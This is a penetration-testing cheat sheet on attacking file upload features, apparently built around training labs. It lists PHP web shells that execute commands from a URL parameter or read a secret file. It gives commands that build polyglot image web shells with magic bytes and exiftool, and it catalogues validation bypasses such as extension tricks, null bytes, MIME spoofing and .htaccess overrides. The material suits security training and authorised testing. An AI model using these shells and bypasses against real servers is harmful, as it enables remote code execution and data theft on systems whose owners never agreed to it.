# File Upload
## General
### Unrestricted File Uploads
Upload a PHP, Java or Python shell
#### Shells
| Info | Command |
|------|---------|
| Read File | `<?php echo file_get_contents('/home/carlos/secret'); ?>` |
| Command Shell (Execute with the 'cmd' paramter) | `<?php echo system($_GET['cmd']); ?>` |

### Bypassing Validation
#### File Extension
Try all default extensions to confirm if all are blocked or just some
* Default extensions
    * PHP: `.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc`
    * ASP: `.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml`
    * Jsp: `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action`
    * Coldfusion: `.cfm, .cfml, .cfc, .dbm`
    * Flash: `.swf`
    * Perl `.pl, .pm, .cgi, .lib`
    * Erlang Yaws Web Server: `.yaws`
* Use double extensions `.jpg.php`
* Use reverse double extension `.php.jpg`
* Mix uppercase and lowercase `.pHp, .pHP5, .PhAr`
* Null byte (Works well against) `pathinfo()`
    * `.php%00.gif`
    * `.php\x00.gif`
    * `.php%00.png`
    * `.php\x00.png`
    * `.php%00.jpg`
    * `.php\x00.jpg`
* Special characters
    * Trailing Characters : `file.php.` Some components will strip or ignore trailing characters.
    * URL Encoding : `file.%2Ephp`
    * Semicolon : `file.php;.jpg`
    * Multibyte unicode characters : `xC0 x2E` or `xC4 xAE` or `xC0 xAE` may be translated to x2E if the filename is parsed as a UTF-8 string and then converted to ASCII. 
    * Multiple dots : `file.php......` , in Windows when a file is created with dots at the end those will be removed.
    * Whitespace characters: `file.php%20`
    * Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
* Extension Stripping
    * Add additional embedded extension `file.p.phphp` which is then stripped to leave a valid extension remaining. 

#### Mime type 
Full list of content type headers /usr/share/seclists/Miscellaneous/web/content-type.txt

* Change 
    * `Content-Type : application/x-php`
    * `Content-Type : application/octet-stream` 
* To 
    * `Content-Type : image/gif`
    * `Content-Type : image/png`
    * `Content-Type : image/jpeg`
    * Set the Content-Type twice: once for unallowed type and once for allowed.
#### Metadata
If a file upload filter checks the metadata of an image it may be possible to embed something there. 
`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" puppy.jpg -o polyglot.php`

#### Magic Bytes
##### Create jpeg with shell
``bash
echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
```


https://en.wikipedia.org/wiki/List_of_file_signatures

* Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.
    * PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
    * JPG: `\xff\xd8\xff`
    * GIF: `GIF87a` OR `GIF8;`
* Shell can also be added in the metadata

#### .htaccess file
Overrides the default settings which may block certain extentions from running. If you can put this file in the upload directory it will enable certain file types to be executeable again. 
`AddType application/x-httpd-php .l33t`